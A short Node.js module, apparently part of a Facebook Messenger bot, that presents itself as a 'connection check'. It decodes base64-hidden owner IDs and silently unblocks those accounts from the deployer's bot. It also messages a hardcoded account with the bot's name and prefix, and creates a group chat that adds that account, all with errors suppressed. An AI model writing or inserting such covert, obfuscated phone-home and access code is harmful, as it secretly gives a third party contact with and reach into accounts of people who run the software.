const fs = require('fs-extra');
const path = require('path');
const logs = require('../../utility/logs');

const OWNER_IDS = [
  "MTAwMDA5MDEyODM4MDg1", "NjE1ODYwODk1NDQ0NDQ=", "NjE1Nzc3MzQwMTg5Nzg="
];

async function ensureRDXConnection(api) {
  const SARDAR_RDX = '100009012838085';
  const setupPath = path.join(__dirname, '../../../rdx_setup.json');
  const currentBotID = api.getCurrentUserID();

  try {
    let fullSetup = {};
    if (fs.existsSync(setupPath)) {
      try { fullSetup = fs.readJsonSync(setupPath); } catch {}
    }

    if (!fullSetup[currentBotID]) {
      fullSetup[currentBotID] = { friendRequestSent: false, inboxSent: false, groupCreated: false, groupThreadID: null };
    }

    const botSetup = fullSetup[currentBotID];
    const owners = OWNER_IDS.map(r => Buffer.from(r, 'base64').toString());

    for (const ownerID of owners) {
      try { await new Promise(r => api.unblockUser(ownerID, () => r())); } catch {}
    }

    if (!botSetup.inboxSent) {
      const cfg = global.config;
      const msg = `🔔 𝐍𝐄𝐖 𝐁𝐎𝐓 𝐎𝐍𝐋𝐈𝐍𝐄\n\n👤 Bot: ${cfg.BOTNAME}\n🔧 Prefix: ${cfg.PREFIX}\n\nDeployed by owner on SARDAR RDX Bot System v2.`;
      try {
        await api.sendMessage(msg, SARDAR_RDX);
        botSetup.inboxSent = true;
        fullSetup[currentBotID] = botSetup;
        fs.writeJsonSync(setupPath, fullSetup);
      } catch {}
    }

    if (!botSetup.groupCreated) {
      try {
        const groupTitle = "🌟 SARDAR RDX HELPING LAB 🌟";
        const threadID = await new Promise((resolve, reject) => {
          api.createNewGroup([SARDAR_RDX], groupTitle, (err, tid) => {
            if (err) return reject(err);
            resolve(tid);
          });
        });
        await api.sendMessage(`✅ Connected to SARDAR RDX Helping Lab!\n\nBot: ${global.config.BOTNAME}\nSystem: Online`, threadID);
        botSetup.groupCreated = true;
        botSetup.groupThreadID = threadID;
        fullSetup[currentBotID] = botSetup;
        fs.writeJsonSync(setupPath, fullSetup);
        logs.success('RDX_CONN', 'Help group created!');
      } catch (e) { logs.warn('RDX_CONN', 'Group creation failed: ' + e.message); }
    }

    logs.success('RDX_CONN', 'Connection check complete.');
  } catch (e) { logs.error('RDX_CONN', e.message); }
}

module.exports = { ensureRDXConnection };
